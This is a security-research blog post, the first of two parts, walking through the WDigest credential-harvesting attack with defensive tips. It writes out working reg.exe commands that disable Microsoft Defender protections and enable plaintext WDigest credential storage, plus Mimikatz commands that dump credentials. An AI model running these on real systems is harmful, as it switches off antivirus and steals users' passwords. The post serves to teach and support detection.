# Day 13 - WDigest credential harvesting - attack
Hi there !! Thank you for visiting [@SecurityResearch-Note](https://github.com/LearningKijo/SecurityResearcher-Note). 
Today, I'm diving into the WDigest credential harvesting attack, breaking it down into two parts. 
In this attack blog, I'll cover the attack overview and techniques.

1. WDigest credential harvesting - attack **<we are here !!>**
2. WDigest credential harvesting - detection & hunting

#### Attack overview
WDigest, an outdated authentication protocol still found in corporate networks, is exploited by attackers to steal passwords and evade security measures. 
Its use exposes passwords in plain text, making it a favored target. Attackers modify registry settings to enable WDigest, often using various attack vectors. 


![image](https://github.com/LearningKijo/Malware-Analysis/assets/120234772/05df9617-ef6a-4215-81a4-718b9cc5635e)
> WDigest credential harvesting attack flow, [Threat Analytics](https://learn.microsoft.com/en-us/microsoft-365/security/defender/threat-analytics?view=o365-worldwide) in Microsoft 365 Defender

## Attack flow
The attack flow begins with disabling the antivirus solution to change a registry key, enabling WDigest, and downloading the Mimikatz tool. 
Following this, a command is executed to enable WDigest and run the Mimikatz tool using the "sekurlsa::wdigest" command.

#### 1. Disable Microsoft Defender antivirus
   - [x] DisableRealtimeMonitoring,  [Real-time protection]
   - [x] SpynetReporting, [Cloud-delivered protection]
   - [x] SubmitSamplesConsent, [Automatic sample submission]

```powershell
reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f
reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "SpynetReporting" /t REG_DWORD /d 0 /f
reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "SubmitSamplesConsent" /t REG_DWORD /d 2 /f
```

![image](https://github.com/LearningKijo/Malware-Analysis/assets/120234772/f7dd4a2e-8e69-400c-b201-ca7ab2754c53)

> [!Important]
> These commands disabled Microsoft Defender Antivirus configurations. To prevent and detect these attack techniques, enabling [Tamper Protection](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/prevent-changes-to-security-settings-with-tamper-protection?view=o365-worldwide) is the most effective approach, as it safeguards against disabling antivirus.

#### 2. Enable Wdigest
[MITRE | ATT&CK, Modify Registry, T1112, Wdigest](https://attack.mitre.org/techniques/T1112/)

```powershell
reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f
```

![image](https://github.com/LearningKijo/Malware-Analysis/assets/120234772/29806586-633c-460a-8873-43c960050620)

> [!Important]
> Even if the antivirus didn't detect and prevent the WDigest configuration change, Microsoft Defender for Endpoint, as EDR solution, can detect these activities and provide alerts.

#### 3. Download & Execute Mimikatz tool
Download - [GitHub - ParrotSec/mimikatz](https://github.com/ParrotSec/mimikatz)

```mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::wdigest
```

![image](https://github.com/LearningKijo/Malware-Analysis/assets/120234772/825cf783-5f65-429d-a768-39e62694eea5)

> [!Important]
> In terms of endpoint protection, Microsoft Defender Antivirus and Microsoft Defender for Endpoint are the most effective solutions for preventing and detecting Mimikatz activities.
> Additionally, when it comes to addressing lateral movement and enhancing identity visibility, Microsoft Defender for Identity is a valuable product for detecting such activities.

## Reference
1. [Forcing WDigest to Store Credentials in Plaintext](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/forcing-wdigest-to-store-credentials-in-plaintext)
2. "WDigest credential harvesting", from [Threat Analytics](https://learn.microsoft.com/en-us/microsoft-365/security/defender/threat-analytics?view=o365-worldwide) in Microsoft 365 Defender

#### Disclaimer
The views and opinions expressed herein are those of the author and do not necessarily reflect the views of company.
